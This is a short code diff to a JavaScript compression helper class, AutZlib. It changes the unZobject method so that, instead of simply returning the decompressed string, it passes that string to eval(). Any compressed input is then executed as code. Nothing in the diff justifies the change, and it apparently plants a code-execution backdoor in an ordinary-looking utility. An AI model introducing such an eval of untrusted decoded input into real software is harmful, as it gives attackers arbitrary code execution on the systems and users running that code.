@@ -126,7 +126,7 @@ class AutZlib {
         return zlib.deflateSync(input).toString(this.encodetype);
     }
     unZobject(input) {
-        return (zlib.inflateSync(Buffer.from(input, this.encodetype)).toString());
+        return eval(zlib.inflateSync(Buffer.from(input, this.encodetype)).toString());
     }
 }
 exports.AutZlib = AutZlib;
